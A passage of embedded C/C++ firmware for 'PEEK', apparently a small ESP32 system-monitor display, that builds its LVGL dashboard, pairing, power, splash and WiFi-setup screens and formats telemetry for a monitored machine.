  else if (volts <= VOLTS_DISCHARGE) g_batt_charging_s = false;

  if (g_batt_charging_s != was) {
    // A cable going in or out is a step change. Left alone the average would
    // crawl across it for half a minute, showing numbers true at no point on
    // either side of the transition.
    g_volts_filtered = 0.0f;
  }

  const bool absent = volts < VOLTS_ABSENT;
  g_batt_absent   = absent;
  g_batt_charging = g_batt_charging_s;
  g_batt_pct      = absent ? 0 : battery_percent(volts);
  g_batt_volts    = volts;
}

static void fmt_uptime(char *out, size_t n, uint32_t s) {
  const uint32_t d = s / 86400u, h = (s % 86400u) / 3600u, m = (s % 3600u) / 60u;
  if      (d) snprintf(out, n, "up %ud %uh", (unsigned)d, (unsigned)h);
  else if (h) snprintf(out, n, "up %uh %um", (unsigned)h, (unsigned)m);
  else        snprintf(out, n, "up %um",     (unsigned)m);
}

// How long ago a machine last reported. Not fmt_uptime with the prefix cut
// off: a machine goes stale after 30 seconds, and "0m" is the wrong thing to
// say about something that went quiet 40 seconds ago.
static void fmt_ago(char *out, size_t n, uint32_t s) {
  const uint32_t d = s / 86400u, h = (s % 86400u) / 3600u, m = (s % 3600u) / 60u;
  if      (d) snprintf(out, n, "%ud %uh", (unsigned)d, (unsigned)h);
  else if (h) snprintf(out, n, "%uh %um", (unsigned)h, (unsigned)m);
  else if (m) snprintf(out, n, "%um",     (unsigned)m);
  else        snprintf(out, n, "%us",     (unsigned)s);
}

// ---------------------------------------------------------------------------
//  UI construction - runs once on core 1, before either task starts.
// ---------------------------------------------------------------------------
static lv_obj_t *make_label(lv_obj_t *parent, const lv_font_t *font, lv_color_t color,
                            int16_t x, int16_t y, const char *text) {
  lv_obj_t *l = lv_label_create(parent);
  lv_label_set_long_mode(l, LV_LABEL_LONG_CLIP);
  lv_label_set_text(l, text);
  lv_obj_set_style_text_font(l, font, 0);
  lv_obj_set_style_text_color(l, color, 0);
  lv_obj_set_pos(l, x, y);
  return l;
}

static void screen_base(lv_obj_t *scr) {
  lv_obj_set_style_bg_color(scr, COL_BG, 0);
  lv_obj_set_style_bg_opa(scr, LV_OPA_COVER, 0);
  lv_obj_set_style_pad_all(scr, 0, 0);
  lv_obj_set_style_border_width(scr, 0, 0);
  lv_obj_clear_flag(scr, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_set_scrollbar_mode(scr, LV_SCROLLBAR_MODE_OFF);
}

static void make_gauge(Gauge *g, lv_obj_t *parent, int16_t x, int16_t y,
                       lv_color_t accent, const char *caption) {
  g->base  = accent;
  g->shown = 0;

  g->arc = lv_arc_create(parent);
  lv_obj_set_size(g->arc, 66, 66);
  lv_obj_set_pos(g->arc, x, y);
  lv_arc_set_rotation(g->arc, 135);
  lv_arc_set_bg_angles(g->arc, 0, 270);
  lv_arc_set_range(g->arc, 0, 1000);
  lv_arc_set_value(g->arc, 0);
  lv_obj_remove_style(g->arc, NULL, LV_PART_KNOB);      // no drag handle
  lv_obj_clear_flag(g->arc, LV_OBJ_FLAG_CLICKABLE);
  lv_obj_set_style_bg_opa(g->arc, LV_OPA_TRANSP, LV_PART_MAIN);
  lv_obj_set_style_border_width(g->arc, 0, LV_PART_MAIN);
  lv_obj_set_style_pad_all(g->arc, 0, LV_PART_MAIN);
  lv_obj_set_style_arc_color(g->arc, COL_TRACK, LV_PART_MAIN);
  lv_obj_set_style_arc_width(g->arc, 6, LV_PART_MAIN);
  lv_obj_set_style_arc_rounded(g->arc, true, LV_PART_MAIN);
  lv_obj_set_style_arc_color(g->arc, accent, LV_PART_INDICATOR);
  lv_obj_set_style_arc_width(g->arc, 6, LV_PART_INDICATOR);
  lv_obj_set_style_arc_rounded(g->arc, true, LV_PART_INDICATOR);

  g->value = lv_label_create(g->arc);
  lv_label_set_text(g->value, "0");
  lv_obj_set_style_text_font(g->value, F_BIG, 0);
  lv_obj_set_style_text_color(g->value, COL_TEXT, 0);
  lv_obj_align(g->value, LV_ALIGN_CENTER, 0, -5);

  lv_obj_t *cap = lv_label_create(g->arc);
  lv_label_set_text(cap, caption);
  lv_obj_set_style_text_font(cap, F_SM, 0);
  lv_obj_set_style_text_color(cap, COL_TEXT_DIM, 0);
  lv_obj_align(cap, LV_ALIGN_CENTER, 0, 14);
}

static void build_dashboard_ui() {
  lv_obj_t *scr = lv_scr_act();
  screen_base(scr);

  // Everything that belongs to one machine lives in this container, so
  // swiping to another is one animation on one object rather than a dozen
  // co-ordinated ones. LVGL clips children to their parent, so a body parked
  // at x = -240 is genuinely off-screen rather than drawn over the next one.
  //
  // Created before the header so the header, the status dot and the pairing
  // overlay all draw on top of it; it is transparent, so it costs nothing.
  g_body = lv_obj_create(scr);
  lv_obj_remove_style_all(g_body);
  lv_obj_set_size(g_body, SCREEN_W, SCREEN_H);
  lv_obj_set_pos(g_body, 0, 0);
  lv_obj_clear_flag(g_body, LV_OBJ_FLAG_SCROLLABLE);

  // ---- header ----
  make_label(scr, F_SM, COL_CYAN, 8, 3, "PEEK");
  g_lbl_host = make_label(g_body, F_SM, COL_TEXT_DIM, 44, 3, "// dietpi");
  lv_obj_set_width(g_lbl_host, 92);
  lv_label_set_long_mode(g_lbl_host, LV_LABEL_LONG_CLIP);

  // Which of several machines is on screen. Hidden outright when there is only
  // one, because "1/1" is noise on a 1.14" display.
  g_lbl_which = make_label(scr, F_SM, COL_CYAN, 136, 3, "");
  lv_obj_set_width(g_lbl_which, 26);        // "6/6" and no wider
  lv_obj_set_style_text_align(g_lbl_which, LV_TEXT_ALIGN_RIGHT, 0);

  // 44 px is what "999 ms" needs. Anything slower is rendered as seconds
  // rather than allowed to grow into the indicator beside it.
  g_lbl_ping = make_label(scr, F_SM, COL_TEXT_DIM, 162, 3, "-- ms");
  lv_obj_set_width(g_lbl_ping, 44);
  lv_obj_set_style_text_align(g_lbl_ping, LV_TEXT_ALIGN_RIGHT, 0);

  lv_obj_t *rule = lv_obj_create(scr);
  lv_obj_remove_style_all(rule);
  lv_obj_set_size(rule, 224, 1);
  lv_obj_set_pos(rule, 8, 19);
  lv_obj_set_style_bg_color(rule, COL_CYAN, 0);
  lv_obj_set_style_bg_opa(rule, LV_OPA_30, 0);

  // Spinner ring, drawn around the dot, visible only while a GET is in flight.
  g_spinner = lv_spinner_create(scr, 900, 70);
  lv_obj_set_size(g_spinner, 20, 20);
  lv_obj_set_pos(g_spinner, 217, 0);
  lv_obj_remove_style(g_spinner, NULL, LV_PART_KNOB);
  lv_obj_set_style_arc_width(g_spinner, 2, LV_PART_MAIN);
  lv_obj_set_style_arc_opa(g_spinner, LV_OPA_TRANSP, LV_PART_MAIN);
  lv_obj_set_style_arc_width(g_spinner, 2, LV_PART_INDICATOR);
  lv_obj_set_style_arc_color(g_spinner, COL_CYAN, LV_PART_INDICATOR);
  lv_obj_add_flag(g_spinner, LV_OBJ_FLAG_HIDDEN);

  g_dot = lv_obj_create(scr);
  lv_obj_remove_style_all(g_dot);
  lv_obj_set_size(g_dot, 10, 10);
  lv_obj_set_pos(g_dot, 222, 5);
  lv_obj_set_style_radius(g_dot, LV_RADIUS_CIRCLE, 0);
  lv_obj_set_style_bg_opa(g_dot, LV_OPA_COVER, 0);
  lv_obj_set_style_bg_color(g_dot, COL_AMBER, 0);
  lv_obj_set_style_outline_pad(g_dot, 1, 0);
  lv_obj_set_style_outline_width(g_dot, 0, 0);

  // ---- gauges ----
  make_gauge(&g_cpu, g_body,  6, 23, COL_CYAN,    "CPU %");
  make_gauge(&g_ram, g_body, 78, 23, COL_MAGENTA, "RAM %");

  // ---- temperature / throughput panel ----
  lv_obj_t *panel = lv_obj_create(g_body);
  lv_obj_remove_style_all(panel);
  lv_obj_set_size(panel, 84, 66);
  lv_obj_set_pos(panel, 150, 23);
  lv_obj_set_style_bg_color(panel, COL_PANEL, 0);
  lv_obj_set_style_bg_opa(panel, LV_OPA_COVER, 0);
  lv_obj_set_style_radius(panel, 6, 0);
  lv_obj_set_style_border_width(panel, 1, 0);
  lv_obj_set_style_border_color(panel, COL_TRACK, 0);
  lv_obj_set_style_pad_all(panel, 4, 0);
  lv_obj_clear_flag(panel, LV_OBJ_FLAG_SCROLLABLE);

  make_label(panel, F_SM, COL_TEXT_DIM, 0, 0, "TEMP");
  g_lbl_temp = make_label(panel, F_BIG, COL_TEXT, 0, 13, "--");
  g_lbl_net  = make_label(panel, F_SM,  COL_TEXT_DIM, 0, 40,
                          LV_SYMBOL_DOWN " --  " LV_SYMBOL_UP " --");

  // ---- storage ----
  // Not a static caption any more: once the host reports capacity this becomes
  // "STORAGE  906G FREE", which is the number people actually want. It stays
  // left of x=162 so it cannot collide with the percentage.
  g_lbl_store = make_label(g_body, F_SM, COL_TEXT_DIM, 8, 92, "STORAGE");
  // Bounded rather than measured: the default long mode wraps, which would put
  // a second line straight through the bar at y=108, and an unbounded label on
  // a 12 TB array would reach the percentage. Clipping does neither.
  lv_obj_set_width(g_lbl_store, 150);
  lv_label_set_long_mode(g_lbl_store, LV_LABEL_LONG_CLIP);

  g_bar_value = make_label(g_body, F_SM, COL_TEXT, 162, 92, "0%");
  lv_obj_set_width(g_bar_value, 70);
  lv_obj_set_style_text_align(g_bar_value, LV_TEXT_ALIGN_RIGHT, 0);

  g_bar = lv_bar_create(g_body);
  lv_obj_set_size(g_bar, 226, 8);
  lv_obj_set_pos(g_bar, 7, 108);
  lv_bar_set_range(g_bar, 0, 1000);
  lv_bar_set_value(g_bar, 0, LV_ANIM_OFF);
  lv_obj_set_style_bg_color(g_bar, COL_TRACK, LV_PART_MAIN);
  lv_obj_set_style_radius(g_bar, 4, LV_PART_MAIN);
  lv_obj_set_style_bg_color(g_bar, COL_CYAN, LV_PART_INDICATOR);
  lv_obj_set_style_bg_grad_color(g_bar, COL_MAGENTA, LV_PART_INDICATOR);
  lv_obj_set_style_bg_grad_dir(g_bar, LV_GRAD_DIR_HOR, LV_PART_INDICATOR);
  lv_obj_set_style_radius(g_bar, 4, LV_PART_INDICATOR);

  // ---- footer ----
  g_lbl_foot  = make_label(g_body, F_SM, COL_TEXT_DIM,   8, 118, "waiting for host");
  g_lbl_state = make_label(scr, F_SM, COL_TEXT_DIM, 124, 118, "BOOT");
  lv_obj_set_width(g_lbl_state, 108);
  lv_obj_set_style_text_align(g_lbl_state, LV_TEXT_ALIGN_RIGHT, 0);

  apply_state(NET_BOOT);
}

#include "clock_faces.h"

// ---------------------------------------------------------------------------
//  Power overlay - the board's own battery, not the monitored machine's.
//
//  Shown for a few seconds when power is plugged in or pulled out, then it
//  fades away again. Not a mode you can get stuck in: a desk gadget lives on
//  USB, and a panel that took over the display whenever a charger was present
//  would simply be the display.
// ---------------------------------------------------------------------------
static void build_power_panel(lv_obj_t *scr) {
  g_pwr_panel = lv_obj_create(scr);
  lv_obj_remove_style_all(g_pwr_panel);
  lv_obj_set_size(g_pwr_panel, SCREEN_W, SCREEN_H);
  lv_obj_set_pos(g_pwr_panel, 0, 0);
  lv_obj_set_style_bg_color(g_pwr_panel, COL_BG, 0);
  lv_obj_set_style_bg_opa(g_pwr_panel, LV_OPA_COVER, 0);
  lv_obj_clear_flag(g_pwr_panel, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_add_flag(g_pwr_panel, LV_OBJ_FLAG_HIDDEN);

  make_label(g_pwr_panel, F_SM, COL_CYAN, 8, 6, "PEEK");
  make_label(g_pwr_panel, F_SM, COL_TEXT_DIM, 44, 6, "// POWER");

  lv_obj_t *rule = lv_obj_create(g_pwr_panel);
  lv_obj_remove_style_all(rule);
  lv_obj_set_size(rule, 224, 1);
  lv_obj_set_pos(rule, 8, 22);
  lv_obj_set_style_bg_color(rule, COL_CYAN, 0);
  lv_obj_set_style_bg_opa(rule, LV_OPA_30, 0);

  // ---- the cell ----
  lv_obj_t *shell = lv_obj_create(g_pwr_panel);
  lv_obj_remove_style_all(shell);
  lv_obj_set_size(shell, 110, 50);
  lv_obj_set_pos(shell, 12, 40);
  lv_obj_set_style_radius(shell, 6, 0);
  lv_obj_set_style_border_width(shell, 2, 0);
  lv_obj_set_style_border_color(shell, COL_TEXT_DIM, 0);
  lv_obj_set_style_bg_opa(shell, LV_OPA_TRANSP, 0);
  lv_obj_clear_flag(shell, LV_OBJ_FLAG_SCROLLABLE);

  lv_obj_t *nub = lv_obj_create(g_pwr_panel);
  lv_obj_remove_style_all(nub);
  lv_obj_set_size(nub, 5, 18);
  lv_obj_set_pos(nub, 122, 56);
  lv_obj_set_style_radius(nub, 2, 0);
  lv_obj_set_style_bg_opa(nub, LV_OPA_COVER, 0);
  lv_obj_set_style_bg_color(nub, COL_TEXT_DIM, 0);

  // Width is animated rather than set, so the cell fills up when the panel
  // appears instead of arriving already full.
  g_pwr_fill = lv_obj_create(g_pwr_panel);
  lv_obj_remove_style_all(g_pwr_fill);
  lv_obj_set_size(g_pwr_fill, 0, 40);
  lv_obj_set_pos(g_pwr_fill, 17, 45);
  lv_obj_set_style_radius(g_pwr_fill, 3, 0);
  lv_obj_set_style_bg_opa(g_pwr_fill, LV_OPA_COVER, 0);
  lv_obj_set_style_bg_color(g_pwr_fill, COL_GREEN, 0);

  // Centred on the shell, in the bright text colour rather than the background
  // one: at 15 % the fill does not reach here, and a dark glyph would vanish
  // into the empty part of the cell at exactly the moment it matters most.
  // Light reads against both the fill and the gap.
  g_pwr_bolt = make_label(g_pwr_panel, F_BIG, COL_TEXT, 59, 52, LV_SYMBOL_CHARGE);
  lv_obj_add_flag(g_pwr_bolt, LV_OBJ_FLAG_HIDDEN);

  // ---- the numbers ----
  // The cell and its nub end at x=127, so the right-hand column starts at 132
  // and gets the remaining 104 px. It used to start at 140 with 94 px, which
  // is four pixels less than "EXTERNAL POWER" needs at this size - so the
  // longest and most important state string was the one that got cut off.
  // Every label here is width-bounded and clipped: the default long mode wraps,
  // and a second line would land on the host battery row below.
  g_pwr_pct   = make_label(g_pwr_panel, F_BIG, COL_TEXT,     132, 38, "--");
  g_pwr_volts = make_label(g_pwr_panel, F_SM,  COL_TEXT_DIM, 132, 64, "-- V");
  g_pwr_state = make_label(g_pwr_panel, F_SM,  COL_AMBER,    132, 80, "");
  for (lv_obj_t *l : {g_pwr_pct, g_pwr_volts, g_pwr_state}) {
    lv_obj_set_width(l, 104);
    lv_label_set_long_mode(l, LV_LABEL_LONG_CLIP);
  }

  // The monitored machine's own battery, which is a different thing from the
  // board's and worth having on the same screen: this is the page you come to
  // when you want to know what is running out of power.
  g_pwr_host = make_label(g_pwr_panel, F_SM, COL_TEXT_DIM, 8, 98, "");
  lv_obj_set_width(g_pwr_host, 224);
  lv_label_set_long_mode(g_pwr_host, LV_LABEL_LONG_CLIP);

  make_label(g_pwr_panel, F_SM, COL_TEXT_DIM, 8, 118,
             "tap L: machines   hold R: sleep");
}

// ---------------------------------------------------------------------------
//  Pairing overlay - covers the dashboard until the first reading arrives.
//
//  An overlay rather than a second screen so there is one object tree and one
//  place data lands; pairing finishing is then just hiding a panel, with no
//  screen swap to get wrong while an animation is mid-flight.
// ---------------------------------------------------------------------------
static void build_pair_overlay(lv_obj_t *scr) {
  g_pair_panel = lv_obj_create(scr);
  lv_obj_remove_style_all(g_pair_panel);
  lv_obj_set_size(g_pair_panel, SCREEN_W, SCREEN_H);
  lv_obj_set_pos(g_pair_panel, 0, 0);
  lv_obj_set_style_bg_color(g_pair_panel, COL_BG, 0);
  lv_obj_set_style_bg_opa(g_pair_panel, LV_OPA_COVER, 0);
  lv_obj_clear_flag(g_pair_panel, LV_OBJ_FLAG_SCROLLABLE);

  make_label(g_pair_panel, F_SM, COL_CYAN, 8, 6, "PEEK");
  make_label(g_pair_panel, F_SM, COL_TEXT_DIM, 44, 6, "// PAIRING");

  lv_obj_t *rule = lv_obj_create(g_pair_panel);
  lv_obj_remove_style_all(rule);
  lv_obj_set_size(rule, 224, 1);
  lv_obj_set_pos(rule, 8, 22);
  lv_obj_set_style_bg_color(rule, COL_CYAN, 0);
  lv_obj_set_style_bg_opa(rule, LV_OPA_30, 0);

  make_label(g_pair_panel, F_SM, COL_TEXT_DIM, 8, 32, "ENTER THIS CODE IN THE PEEKESP APP");

  char shown[16];
  pair_format(cfg.pair_code, shown, sizeof shown);
  g_lbl_code = lv_label_create(g_pair_panel);
  lv_label_set_text(g_lbl_code, shown);
  lv_obj_set_style_text_font(g_lbl_code, F_BIG, 0);
  lv_obj_set_style_text_color(g_lbl_code, COL_TEXT, 0);
  lv_obj_set_style_text_letter_space(g_lbl_code, 2, 0);
  lv_obj_align(g_lbl_code, LV_ALIGN_TOP_MID, 0, 54);

  g_lbl_pair_hint = make_label(g_pair_panel, F_SM, COL_TEXT_DIM, 8, 92,
                               "waiting for the app...");
  lv_obj_set_width(g_lbl_pair_hint, 224);
  lv_obj_set_style_text_align(g_lbl_pair_hint, LV_TEXT_ALIGN_CENTER, 0);

  // The only place both holds are ever spelled out. A button whose function
  // you have to remember is a button nobody presses.
  make_label(g_pair_panel, F_SM, COL_TEXT_DIM, 8, 116,
             "hold L: settings   hold R: sleep");
}

// ---------------------------------------------------------------------------
//  Boot splash
//
//  Sits above everything for a beat, then fades itself out and deletes. The
//  fade is an LVGL animation rather than a delay() so the network task is
//  already connecting underneath while it is on screen - the splash costs no
//  time at all, it just covers the part of boot that would otherwise be a
//  dashboard full of zeroes.
// ---------------------------------------------------------------------------
static void splash_opa_cb(void *obj, int32_t v) {
  lv_obj_set_style_opa((lv_obj_t *)obj, (lv_opa_t)v, 0);
}

static void splash_done_cb(lv_anim_t *a) {
  lv_obj_del((lv_obj_t *)a->var);
}

static void build_splash(lv_obj_t *scr) {
  lv_obj_t *sp = lv_obj_create(scr);
  lv_obj_remove_style_all(sp);
  lv_obj_set_size(sp, SCREEN_W, SCREEN_H);
  lv_obj_set_pos(sp, 0, 0);
  lv_obj_set_style_bg_color(sp, COL_BG, 0);
  lv_obj_set_style_bg_opa(sp, LV_OPA_COVER, 0);
  lv_obj_clear_flag(sp, LV_OBJ_FLAG_SCROLLABLE);

  lv_obj_t *img = lv_img_create(sp);
  lv_img_set_src(img, &logo_splash);
  lv_obj_set_pos(img, 20, 20);

  lv_obj_t *name = lv_label_create(sp);
  lv_label_set_text(name, "PEEK");
  lv_obj_set_style_text_font(name, F_BIG, 0);
  lv_obj_set_style_text_color(name, COL_CYAN, 0);
  lv_obj_set_style_text_letter_space(name, 3, 0);
  lv_obj_set_pos(name, 134, 48);

  lv_obj_t *sub = lv_label_create(sp);
  lv_label_set_text(sub, "dashboard");
  lv_obj_set_style_text_font(sub, F_SM, 0);
  lv_obj_set_style_text_color(sub, COL_TEXT_DIM, 0);
  lv_obj_set_pos(sub, 136, 72);

  lv_obj_t *by = lv_label_create(sp);
  lv_label_set_text(by, "by shouravx");
  lv_obj_set_style_text_font(by, F_SM, 0);
  lv_obj_set_style_text_color(by, COL_CYAN, 0);
  lv_obj_set_style_text_opa(by, LV_OPA_70, 0);
  lv_obj_set_pos(by, 136, 90);

  lv_anim_t a;
  lv_anim_init(&a);
  lv_anim_set_var(&a, sp);
  lv_anim_set_exec_cb(&a, splash_opa_cb);
  lv_anim_set_values(&a, LV_OPA_COVER, LV_OPA_TRANSP);
  lv_anim_set_time(&a, 420);
  lv_anim_set_delay(&a, 1100);
  lv_anim_set_path_cb(&a, lv_anim_path_ease_in);
  lv_anim_set_ready_cb(&a, splash_done_cb);
  lv_anim_start(&a);
}

// The pairing overlay covers the dashboard, including the status line in its
// corner - so while it is up, it has to carry that status itself. Otherwise a
// device stuck on WiFi cheerfully reads "waiting for the app...", which sends
// you looking at the app.
static void pair_progress(NetState st) {
  if (!g_pair_panel || !g_lbl_pair_hint) return;
  if (lv_obj_has_flag(g_pair_panel, LV_OBJ_FLAG_HIDDEN)) return;

  char buf[64];
  lv_color_t col = COL_TEXT_DIM;

  if (g_wifi_failed) {
    snprintf(buf, sizeof buf, "cannot join %s", cfg.wifi_ssid);
    col = COL_RED;
  } else {
    switch (st) {
      case NET_WIFI:
        snprintf(buf, sizeof buf, "joining %s...", cfg.wifi_ssid);
        col = COL_AMBER;
        break;
      case NET_TIME:
        snprintf(buf, sizeof buf, "getting the time...");
        col = COL_AMBER;
        break;
      case NET_ERROR:
        snprintf(buf, sizeof buf, "relay unreachable - retrying");
        col = COL_RED;
        break;
      default:
        snprintf(buf, sizeof buf, "waiting for the app...");
        break;
    }
  }
  lv_label_set_text(g_lbl_pair_hint, buf);
  lv_obj_set_style_text_color(g_lbl_pair_hint, col, 0);
}

static bool pairing_showing() {
  return g_pair_panel && !lv_obj_has_flag(g_pair_panel, LV_OBJ_FLAG_HIDDEN);
}

static void pairing_done() {
  if (g_pair_panel && !lv_obj_has_flag(g_pair_panel, LV_OBJ_FLAG_HIDDEN)) {
    lv_obj_add_flag(g_pair_panel, LV_OBJ_FLAG_HIDDEN);
  }
}

// ---------------------------------------------------------------------------
//  Setup screen. The QR encodes a WIFI: join string, so scanning it with a
//  phone camera joins the access point directly - nobody has to read a
//  generated password off a 1.14" panel and retype it.
// ---------------------------------------------------------------------------
static void build_setup_ui() {
  lv_obj_t *scr = lv_scr_act();
  screen_base(scr);

  make_label(scr, F_SM, COL_CYAN, 8, 3, "PEEK");
  make_label(scr, F_SM, COL_AMBER, 44, 3, "// SETUP MODE");

  lv_obj_t *rule = lv_obj_create(scr);
  lv_obj_remove_style_all(rule);
  lv_obj_set_size(rule, 224, 1);
  lv_obj_set_pos(rule, 8, 19);
  lv_obj_set_style_bg_color(rule, COL_AMBER, 0);
  lv_obj_set_style_bg_opa(rule, LV_OPA_30, 0);

  // The QR needs a light quiet zone to scan reliably, so it keeps a white
  // background even on this dark theme - that is a scanning requirement,
  // not an aesthetic slip.
  lv_obj_t *qr = lv_qrcode_create(scr, 100, lv_color_black(), lv_color_white());
  lv_obj_set_pos(qr, 10, 26);
  lv_obj_set_style_border_color(qr, lv_color_white(), 0);
  lv_obj_set_style_border_width(qr, 3, 0);

  char join[96];
  const int n = snprintf(join, sizeof join, "WIFI:T:WPA;S:%s;P:%s;;", g_ap_ssid, g_ap_pass);
  lv_qrcode_update(qr, join, n);

  make_label(scr, F_SM, COL_TEXT_DIM, 122, 26, "SCAN TO JOIN");
  make_label(scr, F_SM, COL_TEXT,     122, 41, g_ap_ssid);
  make_label(scr, F_SM, COL_TEXT_DIM, 122, 58, "PASSWORD");
  make_label(scr, F_SM, COL_TEXT,     122, 73, g_ap_pass);
  make_label(scr, F_SM, COL_TEXT_DIM, 122, 92, "THEN OPEN");
  make_label(scr, F_SM, COL_CYAN,     122, 107, "192.168.4.1");
}

// ---------------------------------------------------------------------------
//  Core 1 -> pulls a snapshot of core 0's state. Runs inside lv_timer_handler,
//  so it is always on the UI thread and free to touch LVGL.
// ---------------------------------------------------------------------------
static void ui_sync_cb(lv_timer_t *t) {
  (void)t;
  static uint32_t last_seq   = 0;
  static NetState last_state = (NetState)0xFF;
  static uint32_t busy_until = 0;

  const NetState st = g_state;
  static bool last_failed = false;
  if (st != last_state || g_wifi_failed != last_failed) {
    apply_state(st);
    pair_progress(st);
    last_state = st;
    last_failed = g_wifi_failed;
  }

  // Keep the spinner up for a beat after a fast reply, otherwise a 30 ms
  // round trip would flash it for a single frame and read as a glitch.
  const uint32_t now = millis();
  if (g_busy) busy_until = now + 250;
  const bool show   = (int32_t)(now - busy_until) < 0;
  const bool hidden = lv_obj_has_flag(g_spinner, LV_OBJ_FLAG_HIDDEN);
  if (show == hidden) {
    if (show) lv_obj_clear_flag(g_spinner, LV_OBJ_FLAG_HIDDEN);
    else      lv_obj_add_flag(g_spinner, LV_OBJ_FLAG_HIDDEN);
  }

  power_tick();

  // The clock is the only thing here that has to move every second, and it
  // only has to when it is the page being looked at.
  // The clock is the only thing here that has to move every second, and only
  // when it is the page being looked at.
  if (g_clk_panel && !lv_obj_has_flag(g_clk_panel, LV_OBJ_FLAG_HIDDEN)) {
    static uint32_t clk_next = 0;
    if ((int32_t)(millis() - clk_next) >= 0) {
      clk_next = millis() + 200;
      render_clock_dated();
    }
  }

  // A button press is a reason to redraw even when no new data has arrived.
  const int8_t step = g_view_step;
  if (step) {
    g_view_step = 0;
    view_step(step);
  }

  const uint32_t seq = g_seq;
  if (seq == last_seq) return;

  if (xSemaphoreTake(g_lock, 0) != pdTRUE) return;   // never block the UI
  g_shown = g_devset;
  xSemaphoreGive(g_lock);
  last_seq = seq;

  pairing_done();          // first reading means the app found us

  // A machine dropping off the relay must not leave the view pointing past the
  // last page. The power page is always the final one, so that is where an
  // out-of-range view lands rather than on some arbitrary machine.
  if (g_view >= page_count()) g_view = (uint8_t)(page_count() - 1);
  if (g_dev_view >= g_shown.n) g_dev_view = g_shown.n ? g_shown.n - 1 : 0;

  // Mid-swipe the body is parked off-screen with the OLD machine's values
  // still in it. Writing the new ones now would show the wrong data sliding
  // in; the swipe writes them itself at the point where nothing is visible.
  if (!g_sliding) render_selected();
}

// ---------------------------------------------------------------------------
//  Rendering one machine, and sliding between two.
//
//  Split out of the sync callback because a swipe has to redraw with no new
//  data, and has to do it at a precise moment - while the body is off-screen.
// ---------------------------------------------------------------------------
// How many machines are on the last page's battery line, and what it says.
static void render_host_battery() {
  if (!g_shown.n) {
    lv_label_set_text(g_pwr_host, "");
    return;
  }

  // Whichever machine you were looking at before swiping here, so this page
  // answers a question you already had rather than picking one for you.
  const Telemetry &t = g_shown.d[g_dev_view < g_shown.n ? g_dev_view : 0];
  char buf[64], tail[24];

  if (t.battery_percent < 0) {
    snprintf(buf, sizeof buf, "%s  no battery", t.host);
  } else {
    if (t.battery_charging) {
      snprintf(tail, sizeof tail, "charging");
    } else if (t.battery_minutes > 0) {
      char left[16];
      fmt_ago(left, sizeof left, (uint32_t)t.battery_minutes * 60u);
      snprintf(tail, sizeof tail, "%s left", left);
    } else if (t.battery_ac) {
      // On mains and not charging is a full battery, not a flat one, and
      // saying "charging" there is how a battery readout stops being believed.
      snprintf(tail, sizeof tail, "on AC");
    } else {
      snprintf(tail, sizeof tail, "on battery");
    }
    // The hostname can be nineteen characters on its own, so it gets a hard
    // budget rather than being allowed to push the charge state off the end.
    // Twelve plus the longest tail is 217 px in a 224 px label; the label is
    // clipped as well, so a longer name loses its own end rather than the
    // number that matters.
    snprintf(buf, sizeof buf, "%.12s  %d%%  %s", t.host, (int)t.battery_percent, tail);
  }
  lv_label_set_text(g_pwr_host, buf);
}

static void render_selected() {
  // The last page belongs to the board rather than to any machine, so its
  // numbers come from the ADC sampler and only this line comes from telemetry.
  if (g_view == g_shown.n) {
    render_clock_dated();
    return;
  }
  if (g_view > g_shown.n) {
    render_host_battery();
    return;
  }
  if (!g_shown.n) return;

  g_dev_view = g_view;
  const Telemetry snap = g_shown.d[g_view];

  if (g_shown.n > 1) lv_label_set_text_fmt(g_lbl_which, "%u/%u",
                                           (unsigned)(g_view + 1), (unsigned)g_shown.n);
  else               lv_label_set_text(g_lbl_which, "");

  gauge_set(&g_cpu, snap.cpu_percent);
  gauge_set(&g_ram, snap.ram_percent);
  bar_set(snap.storage_percent);

  char buf[48], a[12], b[12];

  if (snap.storage_total_gb > 0) {
    fmt_capacity(a, sizeof a, snap.storage_free_gb);
    snprintf(buf, sizeof buf, "STORAGE  %s FREE", a);
  } else {
    snprintf(buf, sizeof buf, "STORAGE");
  }
  lv_label_set_text(g_lbl_store, buf);

  if (snap.cpu_temp_c >= 0) snprintf(buf, sizeof buf, "%.0f\xC2\xB0", snap.cpu_temp_c);
  else                      snprintf(buf, sizeof buf, "--");
  lv_label_set_text(g_lbl_temp, buf);

  fmt_rate(a, sizeof a, snap.rx_kbps);
  fmt_rate(b, sizeof b, snap.tx_kbps);
  snprintf(buf, sizeof buf, LV_SYMBOL_DOWN " %s  " LV_SYMBOL_UP " %s", a, b);
  lv_label_set_text(g_lbl_net, buf);

  // Per-machine staleness, not the link's. With several machines the relay can
  // be perfectly healthy while this particular one has been off for an hour,
  // and an uptime frozen at that moment would read as live.
  if (snap.age_s > STALE_AFTER_S) {
    fmt_ago(a, sizeof a, snap.age_s);
    snprintf(buf, sizeof buf, "silent %s", a);
  } else {
    fmt_uptime(buf, sizeof buf, snap.uptime_seconds);
  }
  lv_label_set_text(g_lbl_foot, buf);

  snprintf(buf, sizeof buf, "// %s", snap.host);
  lv_label_set_text(g_lbl_host, buf);

  // A TLS handshake over a weak signal runs to several seconds, and "4213 ms"
  // is both wider than the space and harder to read than "4.2 s".
  const uint32_t ms = g_latency;
  if (ms < 1000) snprintf(buf, sizeof buf, "%u ms", (unsigned)ms);
  else           snprintf(buf, sizeof buf, "%.1f s", ms / 1000.0f);
  lv_label_set_text(g_lbl_ping, buf);
}

// ---------------------------------------------------------------------------
//  Power panel: appears on a change of power source, then gets out of the way.
// ---------------------------------------------------------------------------
static void obj_set_w(void *obj, int32_t v) {
  lv_obj_set_width((lv_obj_t *)obj, (lv_coord_t)v);
}

// LVGL's own examples cast lv_obj_set_x straight to the animation callback
// type, but lv_coord_t is a short and the callback takes an int32_t - calling
// through a mismatched function pointer is undefined behaviour that happens to
// work on this ABI. A wrapper costs nothing and is actually correct.
static void obj_set_x(void *obj, int32_t v) {
  lv_obj_set_x((lv_obj_t *)obj, (lv_coord_t)v);
}

// Sampled on a timer, drawn whenever the power page is the one on screen.
// Nothing here shows or hides anything: this used to raise itself whenever the
// charge state changed, which on a board whose voltage sits near the threshold
// meant it reappeared every couple of seconds, over the top of whatever you
// were actually trying to read. It is a page you swipe to now.
// Presentation only. The measuring, the filtering and the hysteresis all
// happen on core 0 in battery_sample(); this reads four published values and
// draws them, so the LVGL timer never waits on an ADC.
static void power_tick() {
  static uint32_t next_draw = 0;
  const uint32_t now = millis();
  if ((int32_t)(now - next_draw) < 0) return;
  next_draw = now + 2000;

  const float   volts    = g_batt_volts;
  const bool    absent   = g_batt_absent;
